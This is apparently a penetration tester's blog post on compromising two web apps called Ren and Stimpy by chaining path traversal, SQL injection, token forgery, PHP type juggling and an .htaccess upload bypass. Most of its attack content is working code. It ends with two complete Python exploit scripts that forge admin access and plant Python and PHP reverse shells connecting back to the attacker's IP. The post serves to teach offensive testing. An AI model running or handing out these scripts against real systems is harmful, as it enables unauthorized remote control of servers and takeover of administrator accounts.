---
title: "sunday scaries: exploiting web apps"
date: 2024-09-29T13:42:35-04:00
draft: false
type: "post"
---

during a recent penetration test, i encountered two linked web apps that i thought would be good case studies for a blog post. let's call them Ren + Stimpy.

Ren is a custom-built web app, designed to manage user interactions + content. users can upload/download content, manager user roles, and interact with the database in the backend. 

Stimpy handles uploaded invoices and user accounts, dealing with a variety of file uploads.

as you'll see, i was able to chain together path traversal, SQL injection, arbitrary file uploads, and type juggling attacks to achieve RCE [Remote Code Execution], and how i assembled the full exploit script piece-by-piece.

i began by analyzing the **download** functionality in Ren. 

```java
@GetMapping({"/download"})
public ResponseEntity<byte[]> getImage(@RequestParam("id") String id) {
    try {
        byte[] image = this.downloadService.getPDF(id.replace("../", ""));
        HttpHeaders headers = new HttpHeaders();
        headers.add("Content-Disposition", "attachment; filename=ren.pdf");
        headers.add("Cache-Control", "no-cache, no-store");
        return ((BodyBuilder)ResponseEntity.ok().headers(headers)).contentType(MediaType.APPLICATION_PDF).body(image);
    } catch (Exception var4) {
        logger.error(var4.getMessage());
        return ResponseEntity.notFound().build();
    }
}
```

this function attempts to filter out path elements like `../`, but this can be bypassed. it filters out `../` from the `id` parameter, but it doesn't account for bypasses like `..././`, which can allow attackers to access files outside the intended directory. 

by injecting a crafted path (`..././`), i was able to retrieve the file `config/uuid`, that contained an encryption key used to secure tokens.

```python
uuid = session.get(target + '/download?id=..././conf/uuid').text
```

next, i analyzed the **administrative** functionality. there's a rather glaring SQL injection vulnerability in the `/admin/users/category?id=` parameter.

```java
public List<User> getUsersWithPostsInCategory(String categoryId) throws Exception {
    String sql = "SELECT u.id, u.username, '***' as password, u.isAdmin, u.isActive, u.email " + "FROM users u LEFT OUTER JOIN stories s ON s.owner_id = u.id " + "LEFT OUTER JOIN categories c ON s.category_id = c.id WHERE s.category_id = " + categoryId;
    return this.template.query(sql, new UserRowMapper());
}
```

this query dynamically inserts `categoryId` without any sanitization. using a stacked SQL query, i injected a reverse shell payload that would connect back to my machine, giving me full remote access to the server.

```python
b64payload = base64.b64encode(f'''
import socket, subprocess, os, pty;
s=socket.socket(socket.AF_INET, socket.SOCK_STREAM);
s.connect(("{IP}", 5555));
os.dup2(s.fileno(), 0);
os.dup2(s.fileno(), 1);
os.dup2(s.fileno(), 2);
pty.spawn("/bin/bash")
'''.encode('utf-8'))

session.get(target + "/admin/users/category?id=1; COPY(SELECT convert_from(decode('" + b64payload.decode('utf-8') + "', 'base64'), 'utf-8')) to '/tmp/shell.py'; DROP TABLE IF EXISTS cmd_exec; CREATE TABLE cmd_exec(cmd_output text); COPY cmd_exec FROM PROGRAM 'python3 /tmp/shell.py';")
```

`socket.socket()` creates a new network socket, and `s.connect()` makes the target connect to my IP address over port `5555`. `os.dup()` redirect the standard input, output, and error file descriptors (`0`, `1`, `2`) to the socket `s`. any command executed on the target will be sent back to me via the socket.

`pty.spawn()` spawns a bash shell, which gives me an interactive command-line session on the target. encoding everything in base64 just means i can transmit binary/special characters as plaintext. 

the target URL `/admin/users/category?id=1` is vulnerable to SQL injection via stacked queries. this means i can append + execute additional SQL commands after the legitimate query.

the base64-encoded payload is injected into the SQL query via `id`, after which the query decodes the payload back to the original Python code, and writes the decoded payload to a temporary file `/tmp/shell.py` on the server, using `COPY` (PostgreSQL).

once the payload is in `/tmp/shell.py`, the SQL injection creates + runs the reverse shell by executing `COPY cmd_exec FROM PROGRAM 'python3 /tmp/shell.py'`. this allows the execution of external programs, running the shell script on the target. the commands `DROP TABLE IF EXISTS cmd_exec` and `CREATE TABLE cmd_exec` are just regular commands used to create temporary tables. i included them just to make the query structure valid in PostgreSQL.


now that Ren's fully compromised, i turned my attention to Stimpy. the first vulnerability i found was in the **file upload** functionality.

```php
public function importInvoices($request, $response) {
    $user = $this->container['auth']->user();
    $directory = $this->container->settings['importDirectory'];
    $uploadedFiles = $request->getUploadedFiles();
    $uploadedFile = $uploadedFiles['file'];
    if ($uploadedFile->getError() === UPLOAD_ERR_OK) {
        $filename = $uploadedFile->getClientFilename();
        $f_validation = $this->container->validator->validate([
            "filename" => $filename
        ], [
            'filename' => v::alnum('.')
        ]);
        if ($f_validation->failed()) {
            return $this->container->helper->error($f_validation->errors, $response);
        }
        if (in_array(pathinfo($filename, PATHINFO_EXTENSION), $this->container->settings['restrictedExt'])) {
            return $this->container->helper->error(["Invalid Extension" => ["Extension is not allowed"]], $response);
        }
    }
}
```

it attempts to block dangerous file extensions using a blacklist: `restrictedExt`. 

however, the list isn't exhaustive. 

```php
'restrictedExt' => ['php', 'php2', 'php3', 'php4', 'php5', 'phtml', 'exe', 'asp', 'cgi', 'vbs', 'pl', 'com']
```

exploiting this is a three-part process. first, i have to upload the `.htaccess` file. this file contains **Apache rewrite rules** that allow execution of files with a `.php6` extension. this will bypass the restricted file extensions.

next, i'll have to upload a PHP reverse shell `shell.php6`. like the shell in Ren, this will connect back to my machine on a specified IP and port.

finally, i'll have to execute. this will be done by sending a `GET` request to the uploaded shell script `/imports/shell.php`.

```python
# upload .htaccess file to enable execution of PHP files with unusual extensions
session.post(target + '/import', files={'file': ('.htaccess', 'RewriteEngine on\nRewriteRule shell.php shell.php6')})

# upload reverse shell in PHP
session.post(target + '/import', files={'file': ('shell.php6', f'<?php $s=fsockopen("{my_ip}",4444); $p=proc_open("/bin/sh -i", array(0=>$s, 1=>$s, 2=>$s), $pipes); ?>')})

# execute the uploaded reverse shell
session.get(target + '/imports/shell.php')
```

now that i've abused the lax file extension restrictions, i can move on to the next vulnerability. i noticed a flaw in the password reset mechanism: **type juggling**. this allows an attacker to bypass the password reset token check and reset the administrator's password.

```php
public function checkResetLink($userId, $time, $sig) {
    $user = User::find($userId);
    if (empty($user->resetToken)) {
        return false;
    } else {
        return $this->generateSig($user->id, $user->resetToken, $time, $user->password) == $sig;
    }
}

public function generateSig($id, $resetToken, $time, $password) {
    return substr(hash("sha256", $id . "|" . $resetToken . "|" . $time . "|" . $password), 0, 8);
}
```

the reset token is being compared using a weak comparison operator `==`. weak comparison can treat two values as equal if they evaluate to the same number, even when they're strings. hence, i can "force" a comparison to return true by using a **magic hash**. for example, the string `0e123456` is considered `0` when evaluated as a number. if the reset token on the server is also weakly compared and happens to be evaluated as `0`, i can bypass the token check!

i created two functions for the exploit: `ResetLink()` and `Test()`. `ResetLink()` sends a password reset request to the server using the `forgot password` endpoint. it submits the admin email to initiate the reset process.

`Test()` checks if the server accepts the password reset link by making a `GET` request to a URL crafted with a **timestamp** `ts` and the **magic hash** `0e123456`. hopefully, it will be interpreted as scientific notation and lead to a false positive.

```python
def ResetLink():
    session.post(target + '/forgot', data={'email': email})

def Test():
    resp = session.get(f'{target}/reset/1/{ts}/0e123456')
    if "Reset your password below" in resp.text:
        return True
    else:
        return False
```

all i need to do now is to repeatedly request a password reset link using the admin's email. the `Test()` function will check if the **magic hash** URL is accepted, and, if so, a new password will be submitted, along with a confirmation of success.

```python
while True:
    ResetLink()
    if Test():
        session.post(f'{target}/reset/1/{ts}/0e123456', data={'password':password})
        print('hell yeah brother!')
        break
```

the final step is **privilege escalation**. recall the **path traversal** exploit that allowed me to retrieve the `config/uuid` file. the UUID is a critical piece because it's the key to decrypting/encrypting session tokens. let's take a look at the `Tokenizer.java` class that i'll exploit.

```java
public class Tokenizer {

    public static String decryptToken(String user, String token, String uuid) {
        try {
            SecretKey key = getKeyForUser(user, uuid);
            Cipher cipher = Cipher.getInstance("DESede/ECB/PKCS5Padding");
            cipher.init(Cipher.DECRYPT_MODE, key);
            byte[] enc = Base64.getUrlDecoder().decode(token.getBytes("UTF-8"));
            byte[] plain = cipher.doFinal(enc);
            return new String(plain, "UTF-8");
        } catch (Exception e) {
            e.printStackTrace();
            return "";
        }
    }

    public static String encryptToken(String user, String token, String uuid) {
        try {
            SecretKey key = getKeyForUser(user, uuid);
            Cipher cipher = Cipher.getInstance("DESede/ECB/PKCS5Padding");
            cipher.init(Cipher.ENCRYPT_MODE, key);
            byte[] enc = cipher.doFinal(token.getBytes("UTF-8"));
            return Base64.getUrlEncoder().encodeToString(enc);
        } catch (Exception e) {
            e.printStackTrace();
            return "";
        }
    }

    private static SecretKey getKeyForUser(String email, String uuid) throws Exception {
        MessageDigest md = MessageDigest.getInstance("SHA-256");
        String keyText = uuid + email;
        byte[] keyArray = new byte[24];
        System.arraycopy(md.digest(keyText.getBytes("UTF-8")), 0, keyArray, 0, 24);
        return new SecretKeySpec(keyArray, "DESede");
    }
}
```



the `decryptToken()` method is used to decrypt the session token from the user's session cookie. the UUID is combined with the user's email to create a **3DES** encryption key using the `getKeyForUser()` method. this key is then used to decrypt the session token (which contains information about the user's privileges, like their role).

here's the annotated code, so you can understand what's going on under the hood.

```java
public static String decryptToken(String user, String token, String uuid) {
    try {
        SecretKey key = getKeyForUser(user, uuid);  // generate the decryption key
        Cipher cipher = Cipher.getInstance("DESede/ECB/PKCS5Padding");  // set up the 3DES cipher
        cipher.init(Cipher.DECRYPT_MODE, key);  // initialize the cipher for decryption
        byte[] enc = Base64.getUrlDecoder().decode(token.getBytes("UTF-8"));  // decode the base64 token
        byte[] plain = cipher.doFinal(enc);  // decrypt the token
        return new String(plain, "UTF-8");  // return the plaintext token
    } catch (Exception e) {
        e.printStackTrace();
        return "";
    }
}
```

```java
private static SecretKey getKeyForUser(String email, String uuid) throws Exception {
    MessageDigest md = MessageDigest.getInstance("SHA-256");
    String keyText = uuid + email;  // concatenate the UUID + email
    byte[] keyArray = new byte[24];  // 3DES key size
    System.arraycopy(md.digest(keyText.getBytes("UTF-8")), 0, keyArray, 0, 24);  // generate the key
    return new SecretKeySpec(keyArray, "DESede");  // return the 3DES key
}
```

the `getKeyForUser()` method generates a decryption key by concatenating the UUID and the email, hashes it using **SHA-256**, and truncates the result to 24 bytes (the length needed for 3DES). the 3DES cipher is initialized using the generated key, and the token is decrypted and returned as a **plain text string**.

once the token is decrypted, i can **modify the role** within it to escalate my privileges. all i have to do is append the `|1` flag (`1` represents admin status) to the token and re-encrypt it, using the same UUID and the target email.

```java
public static String encryptToken(String user, String token, String uuid) {
    try {
        SecretKey key = getKeyForUser(user, uuid);  // generate the encryption key
        Cipher cipher = Cipher.getInstance("DESede/ECB/PKCS5Padding");
        cipher.init(Cipher.ENCRYPT_MODE, key);  // initialize the cipher for encryption
        byte[] enc = cipher.doFinal(token.getBytes("UTF-8"));  // encrypt the token
        return Base64.getUrlEncoder().encodeToString(enc);  // return the base64-encoded encrypted token
    } catch (Exception e) {
        e.printStackTrace();
        return "";
    }
}
```

here are the complete exploits for both Ren + Stimpy!

# Ren

goal: get admin access + execute RCE, using path traversal, token manipulation, and SQL injection.

```python
import requests
import time
import string
import subprocess
import base64
import random
import sys

# step 1: set up my IP and target URL
my_ip = sys.argv[1]  # attacker IP address is passed as an argument
target = 'http://<IP>'     # target application URL

# step 2: generate random username + email
username = ''.join(random.choice(string.ascii_lowercase) for c in range(3))
email = username + '@ren.local'  # email with the generated username

# step 3: initialize session and get main page
session = requests.Session()
session.get(target + '/')  # target's homepage

# step 4: create an account on the target application
session.post(target + '/signup', data={
    'submit': 'Submit',
    'email': email,
    'password': 'L0r3m1p$uM',
    'username': username
})

# step 5: log in and capture the 'rememberme' session token
session.post(target + '/login', data={
    'submit': 'Submit',
    'username': username,
    'password': 'L0r3m1p$uM',
    'rememberme': True  # remember me token is stored in the session
})
myuser_token = session.cookies.get_dict()["rememberme"]  # extract the rememberme token

# step 6: exploit path traversal vulnerability to retrieve UUID
uuid = session.get(target + '/download?id=..././conf/uuid').text  # UUID is the encryption key

# step 7: decrypt the token, modify it to escalate privileges, and re-encrypt
process = subprocess.Popen(['java', 'Tokenizer', myuser_token, email, 'admin@ren.local', uuid], stdout=subprocess.PIPE)
time.sleep(5)  # wait for subprocess to complete
out, err = process.communicate()

# step 8: if there's an error, print it and exit
if err:
    print(err)
    exit()

# step 9: retrieve the admin token from the output
tokenadmin = out.decode("UTF-8")

# step 10: log in as admin using the manipulated token
session.get(target + '/login', cookies={'rememberme': tokenadmin})

# step 11: craft the reverse shell payload and encode it in base64
b64payload = base64.b64encode(f'''
import socket, subprocess, os, pty;
s=socket.socket(socket.AF_INET, socket.SOCK_STREAM);
s.connect(("{my_ip}", 4444));  # Connect to my IP
os.dup2(s.fileno(), 0);  # Redirect stdin
os.dup2(s.fileno(), 1);  # Redirect stdout
os.dup2(s.fileno(), 2);  # Redirect stderr
pty.spawn("/bin/bash")  # Spawn a bash shell
'''.encode('utf-8'))

# step 12: exploit SQL injection vulnerability to run the reverse shell
session.get(target + "/admin/users/category?id=1; COPY(SELECT convert_from(decode('" + b64payload.decode('utf-8') + "', 'base64'), 'utf-8')) to '/tmp/shell.py'; DROP TABLE IF EXISTS cmd_exec; CREATE TABLE cmd_exec(cmd_output text); COPY cmd_exec FROM PROGRAM 'python3 /tmp/shell.py';")
```

# Stimpy

goal: gain admin access + RCE using type juggling and arbitrary file upload.

```python
import requests
import re
import time
import sys

# step 1: set up my IP and target URL
my_ip = sys.argv[1]  # IP
target = "http://<IP>"     # target URL

# step 2: admin account details
email = "admin@stimpy.tld"  # admin email to target
password = 'L0r3m1p$uM'   # new admin password to set
ts = int(time.time())       # generate timestamp for the reset link

# step 3: initialize session and open target's homepage
session = requests.Session()
session.get(target)

# step 4: function to request a password reset link
def ResetLink():
    session.post(target + '/forgot', data={'email': email})

# step 5: function to test if reset token is valid using type juggling
def Test():
    resp = session.get(f'{target}/reset/1/{ts}/0e123456')  # type juggling with magic hash
    if "Reset your password below" in resp.text:
        return True  # success, token accepted
    else:
        return False  # try again

# step 6: brute force magic hash and change admin password
while True:
    ResetLink()  # request password reset link
    if Test():  # check if reset link is accepted
        session.post(f'{target}/reset/1/{ts}/0e123456', data={'password': password})  # reset password
        print('hell yeah brother!')  # success message
        break

# step 7: log in as admin using the new password
session.post(target + '/login', data={'email': email, 'password': password})

# step 8: exploit arbitrary file upload to gain RCE
# upload .htaccess to allow execution of PHP files with unusual extensions
session.post(target + '/import', files={'file': ('.htaccess', 'RewriteEngine on\nRewriteRule shell.php shell.php6')})

# step 9: upload reverse shell as PHP6 file
session.post(target + '/import', files={'file': ('shell.php6', f'<?php $s=fsockopen("{my_ip}", 4444); $p=proc_open("/bin/sh -i", array(0=>$s, 1=>$s, 2=>$s), $pipes); ?>')})

# step 10: execute the reverse shell
session.get(target + '/imports/shell.php')
```

